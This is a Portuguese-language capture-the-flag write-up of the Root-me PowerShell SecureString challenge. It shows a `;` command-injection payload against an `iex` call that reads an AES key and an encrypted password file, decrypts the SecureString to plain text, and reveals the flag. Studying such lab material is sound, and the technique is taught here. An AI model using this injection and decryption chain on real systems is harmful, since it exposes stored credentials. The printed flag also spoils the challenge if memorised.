---
title: "Powershell - SecureString - root-me.org"
date: 2023-12-12
published: true
lang: pt-BR
translation_key: "powershell-securestring-root-me"
original_url: /powershell-securestring-root-me
permalink: /pt-br/powershell-securestring-root-me
---
# [](#intro)Introdução

Vamos fazer o nível 2 do Powershell - Comando Injection CTF. Você pode verificar o nível 1 escrever acima [here](/powershell-command-injection-root-me). Este CTF pode ser encontrado sob a guia de script de aplicativo em [Root-me](https://www.root-me.org).

# [](#level-description)Challenge description
Vamos verificar a declaração:

> Declaração
>
> Recuperar a senha do banco de dados, com uma reviravolta!

Temos basicamente o mesmo problema que o nível 1, mas com uma senha provável mais segura para hackear. Para entrar na máquina, temos de correr:

`ssh -p 2225 app-script-ch19@challenge05.root-me.org`

e fornecer a senha: `app-script-ch19`.

# [](#approach)Aproxime-se da mentalidade

Vamos manter a nossa abordagem atenta. Para aqueles que podem não estar acompanhando de perto cada liberação de nossos write-ups, esta mentalidade é fundada em quatro passos:

1. Compreender conceitos básicos
2. Compreender o problema
3. Criando um ataque
4. Resolvendo

Estes passos estão interligados, e quando seguidos metodicamente, tornam os passos subsequentes mais simples.

## [](#mindset-step1)Passo 1 - Compreendendo conceitos básicos

Nós já cobrimos os princípios de powershell [here](/powershell-command-injection-root-me#step-1---understanding-basic-concepts). No entanto, o que é o "PowerShell SecureString"? Esta foi a minha primeira pergunta, já que não sou fluente nesta linguagem de guião.

Como descrito pela Microsoft:

>  O cmdlet `ConvertTo-SecureString` converte texto simples para proteger strings. [...] A cadeia segura pode ser convertida de volta para uma cadeia criptografada, padrão usando o cmdlet `ConvertFrom-SecureString`. Isto permite que ele seja armazenado em um arquivo para uso posterior. 

Um exemplo de como podemos usar isso é criando uma variável que lê a entrada do usuário e convertê-lo para uma string segura. Vamos ver como isso funciona abrindo nossa shell Linux:

```bash
PS /home/kaizen> $secure = Read-Host -AsSecureString
******
PS /home/kaizen> echo $secure                        
System.Security.SecureString
```
Como podemos ver, a entrada foi convertida para uma string segura e não somos capazes de lê-la. Podemos criptografar nossa string segura usando o cmdlet `ConvertFrom-SecureString`:

```bash
PS /home/kaizen> $encrypted = ConvertFrom-SecureString -SecureString $secure
PS /home/kaizen> echo $encrypted                                            
6800690020006d006f006d00
```
Finalmente, para recuperar a cadeia segura, podemos usar `ConvertTo-SecureString` cmdlet na variável `$encrypted` que criamos:

```bash
PS /home/kaizen> $secure2 = ConvertTo-SecureString -String $encrypted       
PS /home/kaizen> $secure2
System.Security.SecureString
```
Poderíamos também criar uma string segura a partir de um arquivo criptografado:

```bash
PS /home/kaizen> $encrypted = ConvertFrom-SecureString -SecureString $secure -Key (1..16)
PS /home/kaizen> $encrypted | Set-Content encrypted.txt                                  
PS /home/kaizen> $secure2 = Get-Content ./encrypted.txt | ConvertTo-SecureString -Key (1..16)
PS /home/kaizen> $secure2
System.Security.SecureString
```
Isto é apenas o básico. Se você é interessante em aprender mais sobre strings seguras, confira na documentação oficial [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7.4).


## [](#mindset-step1) Passo 2 - Compreender o problema

Vamos verificar a máquina. Assim que entramos, somos recebidos com um programa CLI, igual ao nível 1:

```bash
> ls
Connect to the database With the secure Password: System.Security.SecureString. Backup th
e table ls
Table to dump:
```
Bem, já que resolvemos o nível 1, vamos usar nossa abordagem para coletar informações. Vamos executar nossa injeção de comando `; ls`:

```bash
> ; ls
Connect to the database With the secure Password: System.Security.SecureString. Backup th
e table


    Directory: C:\cygwin64\challenge\app-script\ch19


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/12/2021   9:25 AM             43 .git
-a----       10/29/2020   9:27 AM            361 .passwd.crypt
------       12/12/2021   9:50 AM            748 ._perms
-a----       10/29/2020   9:23 AM            176 AES.key
-a----       10/29/2020   9:30 AM            331 ch19.ps1
```
Boa! Temos acesso a todos estes arquivos. Mas parece que o nosso `.passwd` está criptografado. Vamos usar `; cat .passwd.crypt` para ver:

```bash
> ; cat .passwd.crypt
Connect to the database With the secure Password: System.Security.SecureString. Backup th
e table
76492d1116743f0423413b16050a5345MgB8AEkAMQBwAEwAbgBoAHgARwBXAHkAMgB3AGcAdwB3AHQARQBqAEEAR
QBPAEEAPQA9AHwAMgAyAGMANQA1ADIANwBiADEANQA4ADIANwAwAGIANAA2ADIAMQBlADAANwA3ADIAYgBkADYANg
AyADUAYwAyAGMAYQBhAGUAMAA5ADUAMAA2ADUAYQBjADIAMQAzADIAMgA1AGYANgBkAGYAYgAxAGMAMgAwADUANQB
kADIAMgA0AGQAYgBmADYAMQA4AGQAZgBkAGQAMwAwADUANAA4AGYAMAAyADgAZAAwADEAMgBmAGEAZQBmADgANAAy
ADkA
```
Sim. Esta não é a resposta, senão este problema teria sido o mesmo que o primeiro. Vamos dar uma olhada no código `ch19.ps1` executando o comando `; cat ch19.ps1`:

```powershell
$KeyFile = "AES.key"
$key = Get-Content $KeyFile
$SecurePassword = Get-Content .passwd.crypt | ConvertTo-SecureString -key $Key

while($true){
        Write-Host "Table to dump:"
        Write-Host -NoNewLine "> "
        $table=Read-Host

        iex "Write-Host Connect to the database With the secure Password: $SecurePassword
. Backup the table $table"
}
```
Hm. Interessante. Assim, poderíamos acessar a variável `$SecurePassword`, que pode ser uma versão de string segura do `.passwd.crypt`. Para fazer isso, nós simplesmente corremos:

```bash
> ; echo $SecurePassword
Connect to the database With the secure Password: System.Security.SecureString. Backup th
e table
System.Security.SecureString
```
Como podemos ver, tínhamos razão. Este problema está usando as técnicas encontradas pela documentação da Microsoft para descriptografar a senha com o cmdlet `ConvertTo-SecureString`.

Como somos capazes de acessar a shell powershell, só precisamos encontrar a sequência de comando para transformar a string segura em formato legível. Uma maneira de fazer isso é criando uma variável que converte uma string segura em uma string binária (BSTR). Isso [post](https://stackoverflow.com/questions/28352141/convert-a-secure-string-to-plain-text) fala sobre isso.

Como podemos ver, precisamos de uma série de comandos para obter o que queremos. Antes de tentar na máquina, vamos experimentar nos meus PCs locais:

```bash
PS /home/kaizen> $secure
System.Security.SecureString
PS /home/kaizen> $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)        
PS /home/kaizen> $BSTR
140321549720616
PS /home/kaizen> $unsecure = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
PS /home/kaizen> $unsecure
hacked
```
Mas como poderíamos obter a versão de texto simples do nosso `.passwd`? Bem, é aí que chegamos ao nosso passo 3.

## [](#mindset-step3)Passo 3 - Criando o ataque

Agora que entendemos os conceitos básicos e o problema da CTF, a solução torna-se mais clara. Tome um gole do seu café, sente-se e aproveite nossas descobertas!

1. Nós poderíamos detectar uma vulnerabilidade de injeção de comando neste CLI powershell, onde quando o usuário passa o tubo `;`, nós podemos executar código arbitrário.

2. Sabemos como converter string segura em texto simples.

Unindo ambos, podemos construir o ataque perfeito! Que tal algo como:

```bash
; $key2 = Get-Content $KeyFile; $SecurePassword = Get-Content .passwd.crypt |
ConvertTo-SecureString -key $key2; $BSTR = [System.Runtime.InteropServices.Marsh
al]::SecureStringToBSTR($SecurePassword); $PlainPassword = [System.Runtime.Inter
opServices.Marshal]::PtrToStringAuto($BSTR); echo $PlainPassword
```
Vamos entender esta injeção: primeiro, criamos uma variável chamada `$key2` que irá ler o conteúdo da variável `$KeyFile`. Depois disso, vamos descriptografar o `.passwd.crypt` em uma string segura usando o cmdlet `ConvertTo-SecureString`, armazenando o resultado na variável `$SecurePassword`. Depois disso, simplesmente aplicamos nossa conversão de string segura para string binária, em seguida, para texto simples, como fizemos no Passo 2.

Se tudo correr bem, resolveremos este problema.


## [](#mindset-step4) Passo 4 - Resolvendo!

Vamos tentar a carga de ataque para ver o que acontece.

```bash
Table to dump:
> ; $key2 = Get-Content $KeyFile; $SecurePassword = Get-Content .passwd.crypt | ConvertTo
-SecureString -key $key2; $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringT
oBSTR($SecurePassword); $PlainPassword = [System.Runtime.InteropServices.Marshal]::PtrToS
tringAuto($BSTR); echo $PlainPassword
Connect to the database With the secure Password: System.Security.SecureString. Backup th
e table
SecureStringBypass
```
E aí está! A nossa bandeira!

# [](#conclusions) Conclusão

Neste CTF, entendemos como cordas seguras funcionam em powershell. Aprendemos como criar strings seguras e como convertê-las de volta para uma string binária. Também aprendemos a criptografar e descriptografar strings seguras usando cmdlets `ConvertTo-SecureString` e `ConvertFrom-SecureString`.

Conseguimos resolver esse desafio porque encontramos uma injeção de comando (graças à nossa solução de nível 1, seguida pela conversão de string segura para string binária.

Espero que você tenha gostado deste texto e aprendido algo novo. Como sempre, não se esqueça de fazer sua pesquisa **



<a href="/">Voltar</a>



